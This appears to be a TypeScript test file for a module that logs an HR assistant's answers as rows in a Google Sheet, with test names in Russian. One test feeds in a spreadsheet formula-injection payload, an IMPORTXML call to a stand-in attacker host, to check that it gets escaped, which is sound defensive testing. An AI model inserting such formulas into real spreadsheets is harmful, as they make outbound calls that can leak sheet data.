import { afterEach, describe, expect, it, vi } from "vitest"
import { buildSheetsRow, formatMoscowDateTime, sendToSheets } from "@/lib/assistant/sheets-log"
import type { AssistantAnswer } from "@/lib/validators/assistant"

const AT = new Date("2026-10-06T12:05:09Z")

const answer: AssistantAnswer = {
  query_id: "916eb7ce-fb25-4af9-b635-1f68dfc0dd18",
  status: "answered",
  answer: "Испытательный срок — три месяца.",
  steps: [],
  responsible: null,
  deadline: null,
  sources: [
    {
      source_type: "document",
      source_id: "192e0541-77a2-43b8-b8a4-6ca6c52ba254",
      title: "Регламент адаптации",
      version: "1.2",
      section: "2. Испытательный срок",
    },
    {
      source_type: "article",
      source_id: "292e0541-77a2-43b8-b8a4-6ca6c52ba254",
      title: "Памятка новичку",
      version: null,
      section: "",
    },
  ],
}

describe("buildSheetsRow", () => {
  it("раскладывает ответ по колонкам таблицы", () => {
    const row = buildSheetsRow({
      at: AT,
      userId: "user-1",
      userName: "Иванов Иван",
      question: "Какой испытательный срок?",
      answer,
    })

    expect(row).toEqual([
      "06.10.2026 15:05:09",
      "user-1",
      answer.query_id,
      "Иванов Иван",
      "Какой испытательный срок?",
      "Испытательный срок — три месяца.",
      "Регламент адаптации v1.2, раздел 2. Испытательный срок; Памятка новичку",
      "Ответ дан",
    ])
  })

  it("при ошибке пишет причину в статус и оставляет ответ пустым", () => {
    const row = buildSheetsRow({
      at: AT,
      userId: "user-1",
      userName: "—",
      question: "Вопрос",
      answer: null,
      error: "языковая модель не ответила",
    })

    expect(row[2]).toBe("—")
    expect(row[5]).toBe("")
    expect(row[6]).toBe("")
    expect(row[7]).toBe("Ошибка: языковая модель не ответила")
  })

  it("не даёт таблице выполнить вопрос как формулу", () => {
    const row = buildSheetsRow({
      at: AT,
      userId: "u",
      userName: "u",
      question: '=IMPORTXML("https://evil.example", "//a")',
      answer: { ...answer, answer: "- первый шаг" },
    })
    expect(row[4]).toBe(`'=IMPORTXML("https://evil.example", "//a")`)
    expect(row[5]).toBe("'- первый шаг")
  })

  it("переводит статус «нет информации»", () => {
    const row = buildSheetsRow({
      at: AT,
      userId: "u",
      userName: "u",
      question: "q",
      answer: { ...answer, status: "no_info", sources: [] },
    })
    expect(row[7]).toBe("Нет информации")
  })
})

describe("formatMoscowDateTime", () => {
  it("показывает московское время в формате ДД.ММ.ГГГГ ЧЧ:ММ:СС", () => {
    expect(formatMoscowDateTime(new Date("2026-01-31T21:30:00Z"))).toBe("01.02.2026 00:30:00")
  })
})

describe("sendToSheets", () => {
  afterEach(() => {
    vi.unstubAllEnvs()
    vi.unstubAllGlobals()
  })

  const entry = { at: AT, userId: "u", userName: "u", question: "q", answer }

  it("ничего не отправляет без ASSISTANT_SHEETS_WEBHOOK_URL", async () => {
    vi.stubEnv("ASSISTANT_SHEETS_WEBHOOK_URL", "")
    const fetchMock = vi.fn()
    vi.stubGlobal("fetch", fetchMock)

    expect(await sendToSheets(entry)).toBe(false)
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it("отправляет строку в веб-приложение таблицы", async () => {
    vi.stubEnv("ASSISTANT_SHEETS_WEBHOOK_URL", "https://script.google.com/macros/s/x/exec")
    const fetchMock = vi.fn().mockResolvedValue(new Response("ok", { status: 200 }))
    vi.stubGlobal("fetch", fetchMock)

    expect(await sendToSheets(entry)).toBe(true)
    const [url, init] = fetchMock.mock.calls[0] as [string, RequestInit]
    expect(url).toBe("https://script.google.com/macros/s/x/exec")
    expect(JSON.parse(init.body as string).row).toHaveLength(8)
  })

  it("не пробрасывает сетевую ошибку", async () => {
    vi.stubEnv("ASSISTANT_SHEETS_WEBHOOK_URL", "https://script.google.com/macros/s/x/exec")
    vi.stubGlobal("fetch", vi.fn().mockRejectedValue(new Error("network")))

    expect(await sendToSheets(entry)).toBe(false)
  })
})
